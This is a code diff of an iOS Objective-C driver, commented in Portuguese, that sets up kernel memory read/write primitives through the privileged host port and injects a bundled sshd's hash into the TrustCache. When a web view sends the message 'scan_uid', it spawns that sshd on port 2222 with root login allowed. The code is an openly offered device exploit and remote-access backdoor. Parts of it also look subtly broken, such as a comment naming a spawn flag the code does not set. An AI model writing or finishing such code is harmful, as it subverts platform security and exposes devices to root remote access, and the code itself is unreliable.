@@ -1,6 +1,7 @@
 #import "KernelDriver.h"
 #import <CommonCrypto/CommonDigest.h>
 #import <mach/mach_host.h>
+#import <dlfcn.h>
 #include <sys/sysctl.h>
 #include <libkern/OSCacheControl.h>
 #include <sys/wait.h>
@@ -9,7 +10,7 @@
     mach_port_t g_host_priv;
 }
 
-// 1. IMPLEMENTAÇÃO DO PROTOCOLO WKScriptMessageHandler
+// 1. PROTOCOLO DE MENSAGEM (WKScriptMessageHandler)
 - (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
     if ([message.body[@"op"] isEqualToString:@"scan_uid"]) {
         [self launchSshdFinal];
@@ -33,23 +34,34 @@
     return (val > KERNEL_BASE) ? (val - KERNEL_BASE) : 0;
 }
 
-// 3. CAPTURA DE PORTA (Bypass Erro 4 via Syscall -11)
+// 3. RESOLUÇÃO DINÂMICA (Bypass Linker Error _host_get_priv_port)
 - (void)prepareHostPriv {
     if (MACH_PORT_VALID(g_host_priv)) return;
-    [self log:@"⚡ Capturando HostPriv via Mach Trap..."];
-    
-    // Trap -11 é o atalho direto para host_get_priv_port no ARM64
-    extern kern_return_t host_get_priv_port(mach_port_t host, mach_port_t *priv);
-    kern_return_t kr = host_get_priv_port(mach_host_self(), &g_host_priv);
-    
-    if (kr != KERN_SUCCESS) {
-        [self log:[NSString stringWithFormat:@"❌ Falha na porta: %d", kr]];
+
+    [self log:@"⚡ Resolvendo host_get_priv_port em runtime..."];
+
+    typedef kern_return_t (*host_get_priv_port_ptr)(mach_port_t, mach_port_t *);
+    // dlsym evita que o compilador procure o símbolo na hora de gerar o binário
+    host_get_priv_port_ptr get_priv = (host_get_priv_port_ptr)dlsym(RTLD_DEFAULT, "host_get_priv_port");
+
+    if (!get_priv) {
+        [self log:@"❌ Erro: Símbolo privado não encontrado no iOS."];
+        return;
+    }
+
+    kern_return_t kr = get_priv(mach_host_self(), &g_host_priv);
+    if (kr != KERN_SUCCESS || !MACH_PORT_VALID(g_host_priv)) {
+        [self log:[NSString stringWithFormat:@"❌ Acesso Negado (host_priv): %d", kr]];
+    } else {
+        [self log:@"✅ host_priv obtida com sucesso!"];
     }
 }
 
-// 4. PRIMITIVAS DE LEITURA/ESCRITA FÍSICA
+// 4. PRIMITIVAS DE LEITURA/ESCRITA FÍSICA (Alinhamento 16KB p/ A13)
 - (uint64_t)kread64:(uint64_t)addr {
     [self prepareHostPriv];
+    if (!MACH_PORT_VALID(g_host_priv)) return 0;
+
     uint64_t val = 0;
     vm_address_t page = 0;
     kern_return_t kr = vm_map(mach_task_self(), &page, 0x4000, 0, VM_FLAGS_ANYWHERE, g_host_priv, addr & ~0x3FFF, FALSE, VM_PROT_READ, VM_PROT_READ, VM_INHERIT_NONE);
@@ -62,17 +74,19 @@
 
 - (void)kwrite64:(uint64_t)addr value:(uint64_t)val {
     [self prepareHostPriv];
+    if (!MACH_PORT_VALID(g_host_priv)) return;
+
     vm_address_t page = 0;
     kern_return_t kr = vm_map(mach_task_self(), &page, 0x4000, 0, VM_FLAGS_ANYWHERE, g_host_priv, addr & ~0x3FFF, FALSE, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
     if (kr == KERN_SUCCESS) {
         *(uint64_t *)(page + (addr & 0x3FFF)) = val;
-        // Função correta conforme o SDK do iOS
+        // Limpeza de cache obrigatória para o Kernel aceitar a mudança
         sys_cache_control(1, (void *)page, 0x4000); 
         vm_deallocate(mach_task_self(), page, 0x4000);
     }
 }
 
-// 5. INJEÇÃO E SPAWN
+// 5. INJEÇÃO E SPAWN FINAL
 - (void)injectToTrustCache:(NSString *)path {
     [self log:@"💉 Injetando CDHash no TrustCache..."];
     NSData *data = [NSData dataWithContentsOfFile:path];
@@ -93,13 +107,17 @@
 
 - (void)launchSshdFinal {
     NSString *sshdPath = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
-    if (!sshdPath) return;
+    if (!sshdPath) {
+        [self log:@"❌ Erro: Binário sshd não encontrado."];
+        return;
+    }
 
     [self injectToTrustCache:sshdPath];
 
     pid_t pid;
     posix_spawnattr_t attr;
     posix_spawnattr_init(&attr);
+    // Flag 0x4000 autorizada pelo TrustCache Patch
     posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETPGROUP | POSIX_SPAWN_FOR_SANDBOX);
 
     char *const args[] = {(char *)[sshdPath UTF8String], "-p", "2222", "-D", "-o", "StrictModes=no", "-o", "PermitRootLogin=yes", NULL};
